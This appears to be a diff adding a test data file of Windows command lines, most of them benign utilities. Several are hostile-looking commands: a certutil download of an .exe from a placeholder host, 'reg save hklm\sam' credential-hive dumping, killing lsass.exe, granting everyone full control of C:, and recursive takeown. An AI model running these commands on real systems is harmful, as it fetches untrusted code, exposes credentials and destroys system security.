@@ -1,0 +1,27 @@
+cacls c: /f /t /g everyone:f
+certreq /accept crack.cer
+certutil -urlcache -split -f http://www.test.com/xxx.exe
+choice /c ync /m helloworld
+cmstp /ns /nf /sd /au /s crack.inf
+driverquery /fo csv /si
+eventcreate /t success /id 1000 /l application /d "OK"
+getmac /s localhost /fo csv /v
+gpresult /s localhost /f /x 1.xml
+ipconfig /renew
+mstsc /v:localhost:3389
+msiexec /quiet /forcerestart /l w /a crack.exe
+openfiles /query /s localhost /fo csv /v
+reg save hklm\sam 1.hiv
+robocopy c:\crack c:\windows\temp /mir /mt:32
+schtasks /create /tn doc /sc monthly /tr notepad
+setx /s localhost machine hello
+systeminfo /s localhost /fo csv >> crack.csv
+timeout /t -1 /nobreak
+takeown /s localhost /f c:\*.* /a /r /d y
+taskkill /f /im lsass.exe
+tasklist /s localhost /fo csv
+tcmsetup /c localhost
+where /r c:\windows *.exe
+waitfor /s localhost /si copydone
+whoami /all
+wecutil ds all
